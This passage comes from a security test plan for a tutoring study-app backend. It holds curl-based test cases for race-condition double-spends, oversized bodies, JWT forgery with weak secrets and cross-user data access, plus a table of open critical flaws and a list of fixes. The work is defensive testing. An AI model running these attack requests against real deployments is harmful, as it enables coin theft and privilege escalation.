**Expected:** `Access-Control-Allow-Origin: https://evil.com` in response (or wildcard).  
**Risk:** Any website can make credentialed cross-origin requests. Since auth is JWT (not cookie), CSRF is limited — but combined with XSS (TC-USER-006, TC-MSG-005), CORS wildcard makes exploitation easier. `MEDIUM`

---

### TC-INFRA-002 — No body size limit `🔴 NO-DB`
```bash
# Send 50MB JSON body
python3 -c "import sys; sys.stdout.write('{\"bio\":\"' + 'A'*50_000_000 + '\"}')" | \
  curl -s -X PATCH localhost:3000/user/update/profile \
    -H "Authorization: Bearer <token>" \
    -H "Content-Type: application/json" \
    --data-binary @-
```
**Expected:** `413 Payload Too Large`.  
**Current code:** No `express.json({ limit: '...' })` configured in `main.ts`. Default Express limit is 100KB but NestJS may differ. `MEDIUM`

---

### TC-INFRA-003 — HTTP security headers `🔴 NO-DB`
```bash
curl -I localhost:3000/auth/login
```
**Expected:** `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Strict-Transport-Security`, `X-XSS-Protection`.  
**Current code:** No Helmet middleware. None of these headers present. `MEDIUM`  
**Fix:** `npm install helmet` → `app.use(helmet())` in `main.ts`.

---

### TC-INFRA-004 — Server version disclosure `🔴 NO-DB`
```bash
curl -I localhost:3000/auth/login | grep -i "x-powered-by"
```
**Expected:** Header absent.  
**Current code:** Express sets `X-Powered-By: Express` by default. `LOW`  
**Fix:** `app.disable('x-powered-by')` or use Helmet.

---

### TC-INFRA-005 — Stack trace leakage on internal error `🔴 NO-DB`
```bash
# Trigger a 500 by sending malformed UUID
curl localhost:3000/user/tutor/not-a-uuid
```
**Expected:** `400` or `404` with clean message. No stack trace or internal paths in response.  
**Check:** NestJS default exception filter masks stack traces in production. ✅ But in development (`NODE_ENV=development`), full stack traces are returned.

---

### TC-INFRA-006 — Missing HTTPS enforcement (local only) `INFO`
When deployed to Vercel: all traffic is HTTPS. ✅  
When running locally: HTTP only — no enforcement. Acceptable for dev.

---

### TC-INFRA-007 — JWT_SECRET weak or default `🔴 NO-DB`
Test if `JWT_SECRET` matches common defaults: `"secret"`, `"supersecret"`, `"jwt_secret"`.  
Try to forge a token signed with `"secret"` and send it.  
**Expected:** `401` — server uses a strong random secret.  
**Risk:** If `.env.example` ships with a default secret, dev servers become exploitable.

---

## 12. Race Conditions & Concurrency

### Method
Apache Bench (`ab`), `curl` with `&`, or a simple Node.js script sending parallel requests.

---

### TC-RACE-001 — Double-spend: two simultaneous bookings same coin balance `🟡 DB-NEEDED`
**Setup:** Student has exactly 30 coins. Two bookings both cost 30 coins.  
**Attack:**
```bash
# Fire both simultaneously
curl -X POST localhost:3000/booking -H "..." -d '{"tutorOfferId":"<id30coins>","startAt":"..."}' &
curl -X POST localhost:3000/booking -H "..." -d '{"tutorOfferId":"<id30coins>","startAt":"..."}' &
wait
```
**Expected:** Only one booking succeeds. Balance doesn't go negative.  
**Risk:** The booking service likely reads balance then deducts in a transaction. If the read happens before either write commits, both pass the balance check. `HIGH`

---

### TC-RACE-002 — Concurrent withdrawal exhausts coins `🟡 DB-NEEDED`
**Setup:** Tutor has 100 coins. Fire two simultaneous withdrawal requests of 100 coins each.
```bash
curl -X POST localhost:3000/coins/withdraw -H "..." -d '{"coins_amount":100,...}' &
curl -X POST localhost:3000/coins/withdraw -H "..." -d '{"coins_amount":100,...}' &
wait
```
**Current code:**
```typescript
const profile = await this.prisma.profiles.findUnique({ ... select: { coins_balance } });
// ← BOTH reads happen here before either write
if (profile.coins_balance < dto.coins_amount) throw ...
const [withdrawal] = await this.prisma.$transaction([
  create withdrawal,
  update { coins_balance: { decrement: ... } },
  create coin_transaction,
]);
```
**Expected:** One succeeds, one fails.  
**Actual:** Both reads see balance=100, both pass the check, both decrement → balance = -100. `CRITICAL`  
**Fix:** Use optimistic locking or `UPDATE profiles SET coins_balance = coins_balance - $1 WHERE id = $2 AND coins_balance >= $1 RETURNING *`. If 0 rows updated → throw.

---

### TC-RACE-003 — Concurrent welcome bonus on signup `🟡 DB-NEEDED`
Two simultaneous signups with same email.  
**Expected:** `400 "Email already registered."` for second request.  
**Current code:** Checks `findUnique` then `create` — no DB-level unique index? If Prisma schema has `@unique` on email, DB enforces it. ✅  
**Check:** Confirm `profiles.email` has `@unique` in Prisma schema.

---

### TC-RACE-004 — Concurrent review creation `🟡 DB-NEEDED`
Two simultaneous `POST /reviews` for same booking from same student (using two separate connections).  
**Expected:** Only one review created.  
**Current code:** Checks `findFirst` then `create` — no atomic lock. Race condition possible. `LOW`  
**Fix:** DB unique constraint on `(booking_id, reviewer_id)`.

---

## 13. Business Logic Abuse

### TC-BIZ-001 — Earn coins by booking and immediately canceling `🟡 DB-NEEDED`
1. Student books session (coins deducted).
2. Student cancels booking (coins refunded).
3. Repeat to "cycle" through coin transactions.
**Expected:** No net coin gain. ✅ Refund restores original amount.  
**But:** Does cancellation have a fee? Does it create coin_transaction records that could overflow history?

---

### TC-BIZ-002 — Tutor creates offer with 0 coins/hour `🔴 NO-DB`
```json
{ "title": "Free Math", "coins_per_hour": 0, "duration_minutes": 60, "subject_ids": [] }
```
**Expected:** Allowed (tutor can offer free sessions) or blocked.  
**Check:** `@Min(1)` or similar on `coins_per_hour` in `CreateTutorOfferDto`?

---

### TC-BIZ-003 — Coins balance integer overflow `🟡 DB-NEEDED`
Grant a user `2^31 - 1` coins, then grant 1 more.  
**Expected:** No integer overflow. Postgres `INT4` max is 2,147,483,647. If `coins_balance` is `Int` (INT4), adding beyond this throws a DB error. Should be handled gracefully.  
**Check:** Prisma schema column type for `coins_balance`.

---

### TC-BIZ-004 — Booking with offer price changed after booking `🟡 DB-NEEDED`
1. Tutor offer costs 30 coins/hour.
2. Student books it (30 coins deducted, stored in booking `coins_cost`).
3. Tutor updates offer to 500 coins/hour.
4. Check booking `coins_cost` — should still reflect original 30 coins.  
**Expected:** `coins_cost` is snapshotted at booking creation. ✅

---

### TC-BIZ-005 — Unverified tutor creates offers and receives bookings `🟡 DB-NEEDED`
**Condition:** Tutor skips verification (role escalation via TC-PRIV-001).  
**Test:** Can an unverified TUTOR (verification_status=null) create offers, receive bookings, earn coins?  
**Check:** `createOffer()` fetches `verification_status` but does NOT require it to be `APPROVED`. `MEDIUM`

---

### TC-BIZ-006 — Coin package price manipulation `🔴 NO-DB`
```json
{ "coins_amount": 50, "fiat_amount": 1 }
```
**Expected:** `400` — `CreatePaymentOrderDto` only has `coins_amount`. Fiat amount is server-determined from `COIN_PACKAGES`. ✅ Client cannot set fiat amount.

---

## 14. Data Enumeration & Exfiltration

### TC-ENUM-001 — User ID enumeration `🟡 DB-NEEDED`
UUIDs are used for user IDs — not sequential. Enumeration requires brute-forcing 128 bits of randomness. Not practical.  
**But:** `GET /user/tutors/all` returns all tutor UUIDs. `GET /user/student` returns all student UUIDs. Full user roster is public. `INFO`

---

### TC-ENUM-002 — Email enumeration via signup `🔴 NO-DB`
```bash
curl -X POST localhost:3000/auth/signup \
  -d '{"email":"known@user.com","password":"Password1!"}'
```
**Expected:** `400 "Email already registered."` — confirms email exists.  
**Current code:** `BadRequestException('Email already registered.')` on duplicate email. This is an email oracle. `MEDIUM`  
**Trade-off:** Hard to avoid without silent rejection (which has UX costs).

---

### TC-ENUM-003 — Encrypted PII accessible by admin `🟡 DB-NEEDED`
Tutor verification data (phone, address, ID document URL) is encrypted with `EncryptionService`.  
**Test:** Call `GET /admin/users/:id` as admin — does the response include raw decrypted PII?  
**Expected:** Either encrypted ciphertext returned (admin sees raw strings) or decrypted PII shown only in a special secure view.  
**Risk:** Admin account compromise → all tutor PII exposed.

---

### TC-ENUM-004 — Notification payload leakage `🟡 DB-NEEDED`
```bash
curl localhost:3000/notifications \
  -H "Authorization: Bearer <token>"
```
**Check:** Notification `payload` field is `Json?`. What's stored in there?  
Looking at internal cron: payloads include `booking_id`, `coins_earned`, `coins_refunded`, `reviewer_id`. These are IDs — no raw PII. ✅  
But `coins_earned` / `coins_refunded` amounts could be used for financial correlation. `INFO`

---

### TC-ENUM-005 — Other users' notification access `🟡 DB-NEEDED`
```bash
curl "localhost:3000/notifications?userId=<victim_id>" \
  -H "Authorization: Bearer <attacker_token>"
```
**Expected:** Returns only own notifications.  
**Check:** Does the notifications controller filter by JWT user ID?

---

## 15. Known Vulnerabilities Summary

| ID | Endpoint | Issue | Severity | Status |
|----|----------|-------|----------|--------|
| TC-COIN-001 | `POST /coins/webhook/midtrans` | Signature bypass when no MIDTRANS key → free coins | `CRITICAL` | Open |
| TC-COIN-002 | `POST /coins/dev/fulfill/:id` | No auth guard → anyone can credit coins | `CRITICAL` | Open |
| TC-RACE-002 | `POST /coins/withdraw` | Balance read outside transaction → negative balance | `CRITICAL` | Open |
| TC-PRIV-001 | `PATCH /user/update/profile` | `role` field in DTO → student self-promotes to TUTOR | `CRITICAL` | Open |
| TC-AUTH-010 | `POST /auth/google` | `role` param not validated → TUTOR via Google | `HIGH` | Open |
| TC-AUTHZ-003 | `POST /admin/create` | No JWT guard on endpoint, relies on bootstrap secret | `HIGH` | Mitigated |
| TC-AUTHZ-005 | All JWT-protected routes | Role in JWT payload not re-fetched from DB | `HIGH` | Open |
| TC-AUTH-004 | `POST /auth/login` | No rate limiting → password brute force | `HIGH` | Open |
| TC-BOOK-003 | `POST /booking` | No DB unique constraint on availability slot → double booking | `HIGH` | Verify |
| TC-RACE-001 | `POST /booking` | Coin deduction race → negative balance | `HIGH` | Open |
| TC-USER-006 | `PATCH /user/update/profile` | XSS via bio/full_name (no sanitization) | `HIGH` | Open |
| TC-MSG-005 | `POST /messages` | XSS via message content | `HIGH` | Open |
| TC-ADMIN-001 | `POST /admin/create` | No rate limit on bootstrap secret → brute force | `HIGH` | Open |
| TC-BIZ-005 | `POST /user/tutor/offer` | Unverified tutor can create offers + earn coins | `MEDIUM` | Open |
| TC-AUTH-003 | `POST /auth/login` | Timing side-channel → email existence leak | `MEDIUM` | Open |
| TC-INFRA-001 | All | CORS wildcard allows all origins | `MEDIUM` | Open |
| TC-INFRA-002 | All | No body size limit → memory exhaustion | `MEDIUM` | Open |
| TC-INFRA-003 | All | Missing HTTP security headers (no Helmet) | `MEDIUM` | Open |
| TC-USER-001 | `GET /user/student` | Full student list public, no auth | `MEDIUM` | Open |
| TC-USER-003 | `GET /user/tutors/all` | No pagination → full table dump | `MEDIUM` | Open |
| TC-ENUM-002 | `POST /auth/signup` | Email oracle confirms account existence | `MEDIUM` | Acceptable |
| TC-ADMIN-002 | `POST /admin/create` | Non-constant-time secret comparison | `MEDIUM` | Open |
| TC-CRON-003 | `/internal/*` | Non-constant-time secret comparison | `LOW` | Open |
| TC-INFRA-004 | All | `X-Powered-By: Express` header disclosed | `LOW` | Open |
| TC-AUTH-005 | `GET /auth/dev-token` | Dev token endpoint present in non-prod | `HIGH` | Temp |

---

## Appendix A — Recommended Quick Wins (in priority order)

1. **Remove `role` from `UpdateProfileDTO`** — 5-minute fix, eliminates TC-PRIV-001 (CRITICAL).
2. **Add `@UseGuards(AuthGuard('jwt'))` to `POST /coins/dev/fulfill/:id`** or remove the endpoint — eliminates TC-COIN-002 (CRITICAL).
3. **Always verify Midtrans signature** regardless of env — default-deny, not default-allow — eliminates TC-COIN-001 (CRITICAL).
4. **Move coin balance check inside the Prisma transaction** with an atomic decrement + row-lock — eliminates TC-RACE-002 (CRITICAL).
5. **Add `@nestjs/throttler`** to auth routes — eliminates TC-AUTH-004 (HIGH).
6. **Validate `role` in `POST /auth/google`** against allowed set — eliminates TC-AUTH-010 (HIGH).
7. **Fetch role from DB in `JwtStrategy.validate()`** — eliminates TC-AUTHZ-005 (HIGH).
8. **Add `app.use(helmet())`** — eliminates TC-INFRA-003 (MEDIUM).
9. **Cap `limit` param** on all paginated endpoints to e.g. 100 — eliminates several MEDIUM issues.
10. **Use `crypto.timingSafeEqual`** for secret comparisons — eliminates TC-ADMIN-002, TC-CRON-003.

---

## Appendix B — Test Tools Needed

| Tool | Purpose |
|------|---------|
| `curl` | Manual request crafting |
| `jwt.io` | JWT decode/tamper |
| `apache bench (ab)` | Concurrency/race condition tests |
| `postman` / `insomnia` | Collection-based regression tests |
| `jest` + `supertest` | Unit + integration tests (NestJS native) |
| `artillery` | Load testing for rate limit validation |
| `python3` | Custom payload generation (large body, timing measurement) |

---

*Generated for study-app backend. No Supabase calls made during this analysis. All verdicts from static code review only — mark `🟡 DB-NEEDED` tests as skipped until local DB is available.*
